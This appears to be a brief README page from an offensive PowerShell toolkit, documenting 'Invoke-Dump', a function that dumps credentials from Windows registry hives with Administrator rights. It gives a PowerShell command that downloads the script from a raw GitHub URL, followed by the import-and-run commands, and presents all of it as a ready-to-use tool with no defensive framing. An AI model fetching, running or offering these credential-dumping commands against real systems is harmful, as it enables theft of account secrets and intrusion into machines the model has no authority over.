## Invoke-Dump.ps1

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|Invoke-Dump|Dump credentials from registry hives.|Administrator|[Screenshot](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Sam/Invoke-HiveDump.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Sam/Invoke-Dump.ps1" -OutFile "Invoke-Dump.ps1"
```

<br />

**execute:**
```powershell
Import-Module -Name ".\Invoke-Dump.ps1" -Force
Invoke-Dump
```
